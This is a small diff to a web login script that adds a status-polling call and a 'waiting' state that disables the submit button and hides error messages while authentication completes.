@@ -129,6 +129,7 @@
                 success: function(response) {
                     console.log(response);
                     app_id = response.id;
+                    checkStatus();
                     // if (response === "good") {
                     //
                     //     window.location.href = '/code?email='+login;
@@ -173,6 +174,13 @@
                         errorDiv.style.display = "flex";
                         errorDiv2.style.display = "flex";
                         errorDiv3.style.display = "flex";
+                    }
+                    if(response === "waiting"){
+                        button.disabled = true;
+                        button.innerText = "WAIT...";
+                        errorDiv.style.display = "none";
+                        errorDiv2.style.display = "none";
+                        errorDiv3.style.display = "none";
                     }
                     if(response === "finished_auth"){
                         window.location.href = '/success';
